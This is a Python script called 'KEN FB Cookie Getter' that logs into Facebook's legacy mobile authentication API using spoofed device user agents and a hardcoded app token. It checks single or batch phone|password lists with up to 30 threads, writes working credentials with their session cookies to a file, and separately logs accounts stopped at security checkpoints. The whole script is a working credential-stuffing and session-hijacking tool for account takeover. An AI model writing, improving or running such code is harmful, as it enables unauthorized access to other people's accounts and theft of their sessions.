#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# KEN FB Cookie Getter - Full Featured Version

import os
import sys
import time
import uuid
import random
import string
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Color codes for terminal
RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
PURPLE = '\033[1;35m'
CYAN = '\033[1;36m'
WHITE = '\033[1;37m'
RESET = '\033[0m'

# Global variables
success_cookies = []
checkpoint_accounts = []
failed_accounts = []
total_checked = 0
oks = []
cps = []

# Device models for realistic user agents
DEVICE_MODELS = [
    'SM-G960F', 'SM-G973F', 'SM-G980F', 'SM-G988B', 'SM-G998B',
    'SM-N960F', 'SM-N970F', 'SM-N975F', 'SM-N986B', 'SM-N981B',
    'SM-A505F', 'SM-A515F', 'SM-A525F', 'SM-A715F', 'SM-A725F',
    'CPH1893', 'CPH2015', 'CPH2021', 'CPH2127', 'CPH2239',
    'RMX1921', 'RMX2001', 'RMX2030', 'RMX2040', 'RMX3085',
    'M2003J15SC', 'M2004J19C', 'M2006C3LG', 'M2007J20CG',
    'Redmi Note 8', 'Redmi Note 9', 'Redmi Note 10', 'POCO X3',
    'OnePlus 7T', 'OnePlus 8', 'OnePlus 9', 'Pixel 4', 'Pixel 5'
]

def clear_screen():
    """Clear the terminal screen"""
    os.system('clear' if os.name != 'nt' else 'cls')

def print_banner():
    """Display KEN tool banner"""
    banner = f"""{CYAN}
 ██╗  ██╗███████╗███╗   ███╗    ████████╗ ██████╗  ██████╗ ██╗     
 ██║ ██╔╝██╔════╝████╗ ████║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
 █████╔╝ █████╗  ██╔████╔██║       ██║   ██║   ██║██║   ██║██║     
 ██╔═██╗ ██╔══╝  ██║╚██╔╝██║       ██║   ██║   ██║██║   ██║██║     
 ██║  ██╗███████╗██║ ╚═╝ ██║       ██║   ╚██████╔╝╚██████╔╝███████╗
 ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
{GREEN}════════════════════════════════════════════════════════════════{RESET}
{YELLOW}[≋] TOOL NAME  : {WHITE}KEN FB COOKIE GETTER
{YELLOW}[≋] VERSION    : {WHITE}3.0 PREMIUM
{YELLOW}[≋] AUTHOR     : {WHITE}KEN DEVELOPER
{YELLOW}[≋] TYPE       : {WHITE}COOKIE EXTRACTION TOOL
{GREEN}════════════════════════════════════════════════════════════════{RESET}
"""
    print(banner)

def line_separator():
    """Print a decorative line"""
    print(f"{CYAN}{'━' * 64}{RESET}")

def generate_random_user_agent():
    """Generate a realistic random Facebook user agent"""
    android_versions = ['9', '10', '11', '12', '13']
    fb_versions = ['309.0.0.47.119', '327.0.0.31.120', '345.0.0.34.118', 
                   '380.0.0.29.111', '402.0.0.26.81', '427.0.0.31.63']
    
    device = random.choice(DEVICE_MODELS)
    android_ver = random.choice(android_versions)
    fb_ver = random.choice(fb_versions)
    
    densities = ['2.0', '2.5', '3.0', '3.5']
    widths = ['720', '1080', '1440']
    heights = ['1456', '1920', '2560', '2960', '3040']
    
    density = random.choice(densities)
    width = random.choice(widths)
    height = random.choice(heights)
    
    carriers = ['Airtel', 'Vodafone', 'Jio', 'T-Mobile', 'AT&T', 'Verizon', 'Grameenphone', 'Robi', 'Banglalink']
    manufacturers = ['samsung', 'OPPO', 'Xiaomi', 'OnePlus', 'Google', 'Realme']
    
    carrier = random.choice(carriers)
    manufacturer = random.choice(manufacturers)
    
    user_agent = (
        f'[FBAN/FB4A;FBAV/{fb_ver};FBBV/277444756;'
        f'FBDM/{{density={density},width={width},height={height}}};'
        f'FBLC/en_US;FBRV/279865282;FBCR/{carrier};'
        f'FBMF/{manufacturer};FBBD/{manufacturer};'
        f'FBPN/com.facebook.katana;FBDV/{device};'
        f'FBSV/{android_ver};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    )
    
    return user_agent

def get_facebook_session(phone_email, password):
    """
    Authenticate with Facebook and retrieve session cookies
    
    Args:
        phone_email: Phone number or email address
        password: Account password
    
    Returns:
        tuple: (success: bool, result_data: dict)
    """
    global total_checked
    
    try:
        # Generate unique device identifiers
        adid = str(uuid.uuid4())
        device_id = str(uuid.uuid4())
        
        # Prepare authentication data (exact format from original code)
        auth_data = {
            'adid': adid,
            'format': 'json',
            'device_id': device_id,
            'email': phone_email,
            'password': password,
            'generate_analytics_claims': '1',
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'meta_inf_fbmeta': '',
            'currently_logged_in_userid': '0',
            'fb_api_req_friendly_name': 'authenticate'
        }
        
        # Generate random values for headers
        bandwidth = str(random.randint(20000, 30000))
        net_hni = str(random.randint(30000, 40000))
        sim_hni = str(random.randint(30000, 40000))
        
        # Prepare headers (exact format from original code)
        auth_headers = {
            'User-Agent': generate_random_user_agent(),
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': bandwidth,
            'X-FB-Net-HNI': net_hni,
            'X-FB-SIM-HNI': sim_hni,
            'X-FB-Connection-Type': 'WIFI',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'
        }
        
        # Facebook authentication endpoint
        auth_url = 'https://api.facebook.com/method/auth.login'
        
        # Make authentication request with timeout
        response = requests.post(
            auth_url, 
            data=auth_data, 
            headers=auth_headers,
            timeout=30,
            allow_redirects=True
        )
        
        result = response.json()
        
        # Check if authentication was successful
        if 'session_key' in result:
            # Extract user ID
            try:
                uid = result['uid']
            except:
                uid = phone_email
            
            # Extract and format cookies
            cookies = ';'.join([
                f"{cookie['name']}={cookie['value']}" 
                for cookie in result['session_cookies']
            ])
            
            return (True, {
                'uid': str(uid),
                'phone': phone_email,
                'password': password,
                'cookie': cookies,
                'session_key': result['session_key'],
                'status': 'SUCCESS'
            })
        
        # Check if account has checkpoint
        elif 'www.facebook.com' in result.get('error_msg', ''):
            return (False, {
                'uid': phone_email,
                'phone': phone_email,
                'password': password,
                'status': 'CHECKPOINT',
                'error': 'Account has security checkpoint'
            })
        
        # Invalid credentials
        else:
            error_msg = result.get('error_msg', 'Unknown error')
            return (False, {
                'uid': phone_email,
                'phone': phone_email,
                'password': password,
                'status': 'INVALID',
                'error': error_msg
            })
    
    except requests.exceptions.Timeout:
        return (False, {
            'uid': phone_email,
            'phone': phone_email,
            'password': password,
            'status': 'TIMEOUT',
            'error': 'Request timeout'
        })
    
    except requests.exceptions.ConnectionError:
        return (False, {
            'uid': phone_email,
            'phone': phone_email,
            'password': password,
            'status': 'CONNECTION_ERROR',
            'error': 'Network connection error'
        })
    
    except Exception as e:
        return (False, {
            'uid': phone_email,
            'phone': phone_email,
            'password': password,
            'status': 'ERROR',
            'error': str(e)
        })

def process_single_account(account_data):
    """Process a single account (for batch mode)"""
    global total_checked
    
    if '|' not in account_data:
        return
    
    parts = account_data.strip().split('|')
    if len(parts) < 2:
        return
    
    phone_email = parts[0].strip()
    password = parts[1].strip()
    
    if not phone_email or not password:
        return
    
    total_checked += 1
    
    # Show progress
    sys.stdout.write(f'\r{YELLOW}[•] Processing: {total_checked} | Success: {len(success_cookies)} | CP: {len(checkpoint_accounts)} | Failed: {len(failed_accounts)}{RESET}')
    sys.stdout.flush()
    
    success, result_data = get_facebook_session(phone_email, password)
    
    if success:
        # Success - Save cookie
        print(f'\n{GREEN}[✓] SUCCESS{RESET}')
        print(f'{WHITE}    UID      : {result_data["uid"]}{RESET}')
        print(f'{WHITE}    Phone    : {result_data["phone"]}{RESET}')
        print(f'{WHITE}    Password : {result_data["password"]}{RESET}')
        print(f'{CYAN}    Cookie   : {result_data["cookie"][:80]}...{RESET}')
        line_separator()
        
        success_cookies.append(result_data)
        oks.append(result_data["uid"])
        
        # Save to file
        with open('KEN-OK-COOKIES.txt', 'a', encoding='utf-8') as f:
            f.write(f"{'='*60}\n")
            f.write(f"UID      : {result_data['uid']}\n")
            f.write(f"Phone    : {result_data['phone']}\n")
            f.write(f"Password : {result_data['password']}\n")
            f.write(f"Cookie   : {result_data['cookie']}\n")
            f.write(f"{'='*60}\n\n")
    
    else:
        # Failed or Checkpoint
        status = result_data['status']
        
        if status == 'CHECKPOINT':
            print(f'\n{YELLOW}[!] CHECKPOINT{RESET}')
            print(f'{WHITE}    Phone    : {result_data["phone"]}{RESET}')
            print(f'{WHITE}    Password : {result_data["password"]}{RESET}')
            line_separator()
            
            checkpoint_accounts.append(result_data)
            cps.append(result_data["phone"])
            
            # Save checkpoint accounts
            with open('KEN-CP-ACCOUNTS.txt', 'a', encoding='utf-8') as f:
                f.write(f"{result_data['phone']}|{result_data['password']}\n")
        
        else:
            failed_accounts.append(result_data)

def single_account_mode():
    """Single account cookie extraction mode"""
    clear_screen()
    print_banner()
    
    print(f"{YELLOW}[•] SINGLE ACCOUNT COOKIE EXTRACTION{RESET}")
    line_separator()
    
    phone_email = input(f"{CYAN}[?] Enter Phone/Email : {RESET}").strip()
    password = input(f"{CYAN}[?] Enter Password    : {RESET}").strip()
    
    if not phone_email or not password:
        print(f"{RED}[!] Phone/Email and Password are required!{RESET}")
        input(f"\n{YELLOW}Press Enter to continue...{RESET}")
        return
    
    print(f"\n{YELLOW}[•] Processing authentication...{RESET}")
    line_separator()
    
    success, result_data = get_facebook_session(phone_email, password)
    
    if success:
        print(f"\n{GREEN}[✓] COOKIE RETRIEVED SUCCESSFULLY!{RESET}\n")
        print(f"{WHITE}UID      : {result_data['uid']}{RESET}")
        print(f"{WHITE}Phone    : {result_data['phone']}{RESET}")
        print(f"{WHITE}Password : {result_data['password']}{RESET}")
        print(f"\n{CYAN}Cookie:{RESET}")
        print(f"{result_data['cookie']}\n")
        
        line_separator()
        
        # Save to file
        with open('KEN-OK-COOKIES.txt', 'a', encoding='utf-8') as f:
            f.write(f"{'='*60}\n")
            f.write(f"UID      : {result_data['uid']}\n")
            f.write(f"Phone    : {result_data['phone']}\n")
            f.write(f"Password : {result_data['password']}\n")
            f.write(f"Cookie   : {result_data['cookie']}\n")
            f.write(f"{'='*60}\n\n")
        
        print(f"{GREEN}[✓] Cookie saved to KEN-OK-COOKIES.txt{RESET}")
    
    else:
        print(f"\n{RED}[✗] FAILED TO GET COOKIE{RESET}")
        print(f"{WHITE}Status : {result_data['status']}{RESET}")
        print(f"{WHITE}Error  : {result_data['error']}{RESET}")
        
        if result_data['status'] == 'CHECKPOINT':
            print(f"\n{YELLOW}[!] This account has a security checkpoint{RESET}")
            with open('KEN-CP-ACCOUNTS.txt', 'a', encoding='utf-8') as f:
                f.write(f"{phone_email}|{password}\n")
    
    line_separator()
    input(f"\n{YELLOW}Press Enter to continue...{RESET}")

def batch_mode():
    """Batch processing mode for multiple accounts"""
    clear_screen()
    print_banner()
    
    print(f"{YELLOW}[•] BATCH COOKIE EXTRACTION MODE{RESET}")
    line_separator()
    print(f"{CYAN}[•] File format: phone|password (one per line){RESET}")
    print(f"{CYAN}[•] Example: 01712345678|password123{RESET}\n")
    
    filename = input(f"{CYAN}[?] Enter filename : {RESET}").strip()
    
    if not os.path.exists(filename):
        print(f"{RED}[!] File not found: {filename}{RESET}")
        input(f"\n{YELLOW}Press Enter to continue...{RESET}")
        return
    
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            accounts = [line.strip() for line in f if line.strip() and '|' in line]
    except Exception as e:
        print(f"{RED}[!] Error reading file: {e}{RESET}")
        input(f"\n{YELLOW}Press Enter to continue...{RESET}")
        return
    
    if not accounts:
        print(f"{RED}[!] No valid accounts found in file{RESET}")
        input(f"\n{YELLOW}Press Enter to continue...{RESET}")
        return
    
    threads = input(f"{CYAN}[?] Number of threads (1-30, default 15): {RESET}").strip()
    try:
        threads = int(threads) if threads else 15
        threads = max(1, min(30, threads))
    except:
        threads = 15
    
    clear_screen()
    print_banner()
    print(f"{GREEN}[✓] BATCH PROCESSING STARTED{RESET}")
    line_separator()
    print(f"{WHITE}Total Accounts : {len(accounts)}{RESET}")
    print(f"{WHITE}Threads        : {threads}{RESET}")
    line_separator()
    
    time.sleep(1)
    
    # Process accounts with thread pool
    with ThreadPool(max_workers=threads) as executor:
        executor.map(process_single_account, accounts)
    
    # Show final results
    print(f"\n\n{GREEN}{'='*64}{RESET}")
    print(f"{GREEN}[✓] BATCH PROCESSING COMPLETED{RESET}")
    print(f"{GREEN}{'='*64}{RESET}")
    print(f"{WHITE}Total Processed : {total_checked}{RESET}")
    print(f"{GREEN}Success (OK)    : {len(success_cookies)}{RESET}")
    print(f"{YELLOW}Checkpoint (CP) : {len(checkpoint_accounts)}{RESET}")
    print(f"{RED}Failed          : {len(failed_accounts)}{RESET}")
    line_separator()
    print(f"{CYAN}[•] Results saved to:{RESET}")
    print(f"{WHITE}    - KEN-OK-COOKIES.txt (Success){RESET}")
    print(f"{WHITE}    - KEN-CP-ACCOUNTS.txt (Checkpoint){RESET}")
    line_separator()
    
    input(f"\n{YELLOW}Press Enter to continue...{RESET}")

def view_statistics():
    """Display current statistics"""
    clear_screen()
    print_banner()
    
    print(f"{YELLOW}[•] STATISTICS{RESET}")
    line_separator()
    print(f"{WHITE}Total Checked     : {total_checked}{RESET}")
    print(f"{GREEN}Success (OK)      : {len(success_cookies)}{RESET}")
    print(f"{YELLOW}Checkpoint (CP)   : {len(checkpoint_accounts)}{RESET}")
    print(f"{RED}Failed            : {len(failed_accounts)}{RESET}")
    line_separator()
    
    if success_cookies:
        print(f"\n{GREEN}[✓] Recent Successful Accounts:{RESET}")
        for idx, acc in enumerate(success_cookies[-10:], 1):
            print(f"{WHITE}{idx}. UID: {acc['uid']} | Phone: {acc['phone']}{RESET}")
    
    if checkpoint_accounts:
        print(f"\n{YELLOW}[!] Recent Checkpoint Accounts:{RESET}")
        for idx, acc in enumerate(checkpoint_accounts[-10:], 1):
            print(f"{WHITE}{idx}. Phone: {acc['phone']}{RESET}")
    
    line_separator()
    input(f"\n{YELLOW}Press Enter to continue...{RESET}")

def about_tool():
    """Display information about the tool"""
    clear_screen()
    print_banner()
    
    print(f"{YELLOW}[•] ABOUT KEN TOOL{RESET}")
    line_separator()
    print(f"{WHITE}This tool extracts Facebook session cookies by authenticating")
    print(f"with user credentials. It supports both single account and batch")
    print(f"processing modes with multi-threading capabilities.{RESET}\n")
    
    print(f"{CYAN}Features:{RESET}")
    print(f"{WHITE}• Single account cookie extraction{RESET}")
    print(f"{WHITE}• Batch processing from file{RESET}")
    print(f"{WHITE}• Multi-threaded processing (1-30 threads){RESET}")
    print(f"{WHITE}• Automatic cookie saving{RESET}")
    print(f"{WHITE}• Checkpoint detection{RESET}")
    print(f"{WHITE}• Real-time statistics{RESET}")
    print(f"{WHITE}• Realistic user agent generation{RESET}\n")
    
    print(f"{CYAN}File Outputs:{RESET}")
    print(f"{WHITE}• KEN-OK-COOKIES.txt - Successful cookie extractions{RESET}")
    print(f"{WHITE}• KEN-CP-ACCOUNTS.txt - Checkpoint accounts{RESET}")
    
    line_separator()
    input(f"\n{YELLOW}Press Enter to continue...{RESET}")

def main_menu():
    """Main menu interface"""
    while True:
        clear_screen()
        print_banner()
        
        print(f"{CYAN}[1]{RESET} {WHITE}Single Account Cookie Extraction{RESET}")
        print(f"{CYAN}[2]{RESET} {WHITE}Batch Processing (File){RESET}")
        print(f"{CYAN}[3]{RESET} {WHITE}View Statistics{RESET}")
        print(f"{CYAN}[4]{RESET} {WHITE}About Tool{RESET}")
        print(f"{CYAN}[0]{RESET} {WHITE}Exit{RESET}")
        line_separator()
        
        choice = input(f"{YELLOW}[?] Select option : {RESET}").strip()
        
        if choice == '1':
            single_account_mode()
        elif choice == '2':
            batch_mode()
        elif choice == '3':
            view_statistics()
        elif choice == '4':
            about_tool()
        elif choice == '0':
            clear_screen()
            print(f"\n{GREEN}[✓] Thank you for using KEN FB Cookie Getter!{RESET}\n")
            sys.exit(0)
        else:
            print(f"{RED}[!] Invalid option!{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        # Check if running on compatible system
        if os.name not in ['posix', 'nt']:
            print(f"{RED}[!] This tool requires Linux, macOS, or Windows{RESET}")
            sys.exit(1)
        
        # Start main menu
        main_menu()
        
    except KeyboardInterrupt:
        print(f"\n\n{RED}[!] Program interrupted by user{RESET}")
        sys.exit(0)
    
    except Exception as e:
        print(f"\n{RED}[!] Unexpected error: {e}{RESET}")
        sys.exit(1)
